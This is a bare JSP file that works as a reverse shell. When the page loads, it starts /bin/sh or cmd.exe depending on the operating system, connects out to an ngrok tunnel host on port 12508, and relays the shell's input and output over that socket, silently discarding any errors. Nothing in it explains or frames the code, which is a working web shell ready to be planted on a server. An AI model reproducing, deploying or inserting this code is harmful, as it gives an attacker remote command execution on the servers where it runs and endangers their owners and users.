<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream nJ;
    OutputStream yc;

    StreamConnector( InputStream nJ, OutputStream yc )
    {
      this.nJ = nJ;
      this.yc = yc;
    }

    public void run()
    {
      BufferedReader cA  = null;
      BufferedWriter rKM = null;
      try
      {
        cA  = new BufferedReader( new InputStreamReader( this.nJ ) );
        rKM = new BufferedWriter( new OutputStreamWriter( this.yc ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = cA.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rKM.write( buffer, 0, length );
          rKM.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( cA != null )
          cA.close();
        if( rKM != null )
          rKM.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "8.tcp.ngrok.io", 12508 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
